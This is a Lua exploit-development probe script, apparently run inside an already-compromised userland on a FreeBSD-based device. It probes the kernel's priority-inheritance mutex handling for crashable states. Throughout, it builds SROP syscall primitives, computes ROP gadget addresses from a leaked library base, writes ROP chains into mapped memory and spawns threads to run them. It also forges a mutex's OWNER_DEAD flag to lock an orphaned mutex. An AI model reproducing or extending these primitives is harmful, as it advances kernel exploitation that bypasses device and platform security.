-- CRASH_CLASS: MODERATE
-- PROBE 146c: Orphaned PI mutex — lock owned by dead thread
--
-- 146b showed: child locks PI mutex, exits via thr_exit, owner still = child TID.
-- What happens when another thread tries to lock this orphaned mutex?
-- The kernel's PI chain handler must deal with the dead owner thread.

print("=== PROBE 146c: ORPHAN PI ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_mmap = make_syscall(477)
local sc_thr = make_syscall(430)
local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local brip = memory.read_qword(srop_ctx + MC + 0xA0)
local rh, rl = get_hi_lo(brip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    if not ok then return nil end
    return rv
end

local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), uint64(info)) end)
local elo = to_num(memory.read_dword(info + 0x108))
local ehi = to_num(memory.read_dword(info + 0x10C))

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x400000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
local gh, gl = get_hi_lo(gpu)

local g_ret     = uint64(string.format("0x%X%08X", ehi, elo + 0x42))
local g_pop_rdi = uint64(string.format("0x%X%08X", ehi, elo + 0xC9DFE))
local g_pop_rsi = uint64(string.format("0x%X%08X", ehi, elo + 0xD77D))
local g_pop_rax = uint64(string.format("0x%X%08X", ehi, elo + 0x992))
local g_wr      = uint64(string.format("0x%X%08X", ehi, elo + 0xD0B60))

local ts_short = gpu + 0x61000
wq(ts_short, uint64(0))
wq(ts_short + 8, uint64(50000000))
local ts_short_a = uint64(string.format("0x%X%08X", gh, gl + 0x61000))

local function make_thread_rop(base_off, steps)
    local rop = gpu + base_off
    local rop_a = uint64(string.format("0x%X%08X", gh, gl + base_off))
    local i = 0
    for _, step in ipairs(steps) do
        if step.sleep then
            wq(rop+i, g_pop_rdi); i=i+8
            wq(rop+i, ts_short_a); i=i+8
            wq(rop+i, g_pop_rsi); i=i+8
            wq(rop+i, uint64(0)); i=i+8
            wq(rop+i, g_pop_rax); i=i+8
            wq(rop+i, uint64(240)); i=i+8
            wq(rop+i, sc_addr); i=i+8
        elseif step.syscall then
            wq(rop+i, g_pop_rdi); i=i+8
            wq(rop+i, step.rdi); i=i+8
            wq(rop+i, g_pop_rsi); i=i+8
            wq(rop+i, step.rsi); i=i+8
            wq(rop+i, g_pop_rax); i=i+8
            wq(rop+i, uint64(step.syscall)); i=i+8
            wq(rop+i, sc_addr); i=i+8
        elseif step.marker then
            wq(rop+i, g_pop_rax); i=i+8
            wq(rop+i, step.marker); i=i+8
            wq(rop+i, g_pop_rdi); i=i+8
            wq(rop+i, step.addr); i=i+8
            wq(rop+i, g_wr); i=i+8
        end
    end
    return rop_a
end

local function spawn_thread(rop_addr, ctx_off, tid_off, rdx, r10, r8, r9)
    local tctx = gpu + ctx_off
    for off = 0, 0x4FF, 4 do wd(tctx + off, 0) end
    pcall(function() return sc_gc(uint64(tctx)) end)
    wq(tctx + 0xE0, g_ret)
    wq(tctx + 0xF8, rop_addr)
    wq(tctx + MC + 0x18, rdx or uint64(0))
    wq(tctx + MC + 0x50, r10 or uint64(0))
    wq(tctx + MC + 0x28, r8 or uint64(0))
    wq(tctx + MC + 0x30, r9 or uint64(0))
    local tbuf = gpu + tid_off
    wq(tbuf, uint64(0))
    local ok, rv = pcall(function()
        return sc_thr(uint64(tctx), uint64(tbuf), uint64(0))
    end)
    return ok and rv or nil
end

-- [A] Create orphaned PI mutex via thread A that locks and exits
print("--- [A] ORPHAN CREATE ---")

local mtx = gpu + 0x1000
local mtx_addr = uint64(string.format("0x%X%08X", gh, gl + 0x1000))
wd(mtx, 0)
wd(mtx + 4, 4)  -- PI
for off = 8, 47, 4 do wd(mtx + off, 0) end

local doneA = gpu + 0x2000
wq(doneA, uint64(0))
local doneA_a = uint64(string.format("0x%X%08X", gh, gl + 0x2000))

local ropA = make_thread_rop(0x10000, {
    {sleep = true},
    {syscall = 454, rdi = mtx_addr, rsi = uint64(5)},  -- MUTEX_LOCK
    {marker = uint64("0x00000000AAAA0001"), addr = doneA_a},
    {syscall = 431, rdi = uint64(0), rsi = uint64(0)},  -- thr_exit
})

local rvA = spawn_thread(ropA, 0x20000, 0x30000)
print("thrA=" .. tostring(rvA))

-- Wait 200ms
local tw = memory.alloc(16)
wq(tw, uint64(0))
wq(tw + 8, uint64(200000000))
pcall(function() make_syscall(240)(uint64(tw), uint64(0)) end)

local daA = memory.read_qword(doneA)
local _, dalA = get_hi_lo(daA)
print("doneA=0x" .. string.format("%08X", dalA))

local owner1 = to_num(memory.read_dword(mtx))
print("owner_after_exit=0x" .. string.format("%08X", owner1))

-- Verify thread A is dead (thr_kill should return -1)
local tidA_buf = gpu + 0x30000
local tidA = memory.read_qword(tidA_buf)
local _, tidA_l = get_hi_lo(tidA)
print("tidA=" .. tidA_l)
local kill_rv = srop(433, uint64(tidA_l), uint64(0)) -- thr_kill(tid, 0)
print("thr_kill_A=" .. (kill_rv and tostring(to_num(kill_rv)) or "nil"))

-- [B] Try locking the orphaned mutex from main thread
print("")
print("--- [B] LOCK ORPHAN ---")

-- First try TRYLOCK (op 4) — non-blocking
local try_rv = srop(454, uint64(mtx_addr), uint64(4), uint64(0), uint64(0), uint64(0))
print("trylock=" .. (try_rv and tostring(to_num(try_rv)) or "nil"))
local owner2 = to_num(memory.read_dword(mtx))
print("owner_after_try=0x" .. string.format("%08X", owner2))

-- Try to manually set OWNER_DEAD flag and lock
-- On FreeBSD, if UMUTEX_OWNER_DEAD (0x40000000) is set, lock should succeed
-- and the new owner gets the mutex in an "inconsistent" state
print("setting OWNER_DEAD manually")
local dead_owner = 0x40000000 + owner1
if owner1 < 0x40000000 then
    wd(mtx, dead_owner)
    print("m_owner=0x" .. string.format("%08X", to_num(memory.read_dword(mtx))))

    local lock2 = srop(454, uint64(mtx_addr), uint64(5), uint64(0), uint64(0), uint64(0))
    print("lock_dead=" .. (lock2 and tostring(to_num(lock2)) or "nil"))
    local owner3 = to_num(memory.read_dword(mtx))
    print("owner_after_dead_lock=0x" .. string.format("%08X", owner3))

    -- If we got the lock, unlock it
    if lock2 and to_num(lock2) == 0 then
        print("*** ORPHAN LOCK ACQUIRED ***")
        local ul = srop(454, uint64(mtx_addr), uint64(6), uint64(0), uint64(0), uint64(0))
        print("unlock=" .. (ul and tostring(to_num(ul)) or "nil"))
    end
end

-- [C] Try locking with UMTX_OP_MUTEX_WAIT2 (op 17)
print("")
print("--- [C] MUTEX_WAIT2 ---")
local mtx2 = gpu + 0x3000
local mtx2_addr = uint64(string.format("0x%X%08X", gh, gl + 0x3000))
wd(mtx2, 0)
wd(mtx2 + 4, 4)  -- PI
for off = 8, 47, 4 do wd(mtx2 + off, 0) end

-- Lock normally
local lk = srop(454, uint64(mtx2_addr), uint64(5), uint64(0), uint64(0), uint64(0))
print("lock2=" .. (lk and tostring(to_num(lk)) or "nil"))

-- Try MUTEX_WAIT2 (should be for checking mutex state)
local mw2 = srop(454, uint64(mtx2_addr), uint64(17), uint64(0), uint64(0), uint64(0))
print("wait2=" .. (mw2 and tostring(to_num(mw2)) or "nil"))

-- Unlock
srop(454, uint64(mtx2_addr), uint64(6), uint64(0), uint64(0), uint64(0))

-- [D] Try mutex ops we haven't tested
print("")
print("--- [D] MORE OPS ---")
-- op 2 = UMTX_OP_WAIT (blocks! use with timeout)
-- op 3 = UMTX_OP_WAKE
-- op 4 = UMTX_OP_MUTEX_TRYLOCK
-- op 7 = SET_CEILING
-- op 8 = UMTX_OP_CV_WAIT (blocks!)
-- op 9 = UMTX_OP_CV_SIGNAL
-- op 10 = UMTX_OP_CV_BROADCAST
-- op 11 = UMTX_OP_WAIT_UINT
-- op 12 = UMTX_OP_RW_RDLOCK (blocks!)
-- op 13 = UMTX_OP_RW_WRLOCK (blocks!)
-- op 14 = UMTX_OP_RW_UNLOCK
-- op 15 = UMTX_OP_WAIT_UINT_PRIVATE (blocks!)
-- op 16 = UMTX_OP_WAKE_PRIVATE
-- op 17 = UMTX_OP_MUTEX_WAIT2

-- Test non-blocking ops only
local test_buf = gpu + 0x4000
for off = 0, 63, 4 do wd(test_buf + off, 0) end
local test_a = uint64(string.format("0x%X%08X", gh, gl + 0x4000))

-- op 3 = WAKE (wake nobody, should return 0)
local r3 = srop(454, uint64(test_a), uint64(3), uint64(1), uint64(0), uint64(0))
print("op3_WAKE=" .. (r3 and tostring(to_num(r3)) or "nil"))

-- op 4 = MUTEX_TRYLOCK on unlocked mutex
local r4 = srop(454, uint64(test_a), uint64(4), uint64(0), uint64(0), uint64(0))
print("op4_TRYLOCK=" .. (r4 and tostring(to_num(r4)) or "nil"))
local o4 = to_num(memory.read_dword(test_buf))
print("  owner=0x" .. string.format("%08X", o4))
-- Unlock after trylock
srop(454, uint64(test_a), uint64(6), uint64(0), uint64(0), uint64(0))

-- op 7 = SET_CEILING
wd(test_buf, 0)
wd(test_buf + 4, 8)  -- UMUTEX_PRIO_PROTECT
local r7 = srop(454, uint64(test_a), uint64(7), uint64(100), uint64(0), uint64(0))
print("op7_CEILING=" .. (r7 and tostring(to_num(r7)) or "nil"))

-- op 9 = CV_SIGNAL
local cv_buf = gpu + 0x5000
for off = 0, 63, 4 do wd(cv_buf + off, 0) end
local cv_a = uint64(string.format("0x%X%08X", gh, gl + 0x5000))
local r9 = srop(454, uint64(cv_a), uint64(9), uint64(0), uint64(0), uint64(0))
print("op9_CV_SIGNAL=" .. (r9 and tostring(to_num(r9)) or "nil"))

-- op 10 = CV_BROADCAST
local r10 = srop(454, uint64(cv_a), uint64(10), uint64(0), uint64(0), uint64(0))
print("op10_CV_BCAST=" .. (r10 and tostring(to_num(r10)) or "nil"))

-- op 14 = RW_UNLOCK
local rw_buf = gpu + 0x6000
for off = 0, 63, 4 do wd(rw_buf + off, 0) end
local rw_a = uint64(string.format("0x%X%08X", gh, gl + 0x6000))
local r14 = srop(454, uint64(rw_a), uint64(14), uint64(0), uint64(0), uint64(0))
print("op14_RW_UNLOCK=" .. (r14 and tostring(to_num(r14)) or "nil"))

-- op 16 = WAKE_PRIVATE
local r16 = srop(454, uint64(test_a), uint64(16), uint64(1), uint64(0), uint64(0))
print("op16_WAKE_PRIV=" .. (r16 and tostring(to_num(r16)) or "nil"))

print("")
print("pid_post=" .. tostring(to_num(make_syscall(20)())))
print("=== DONE ===")
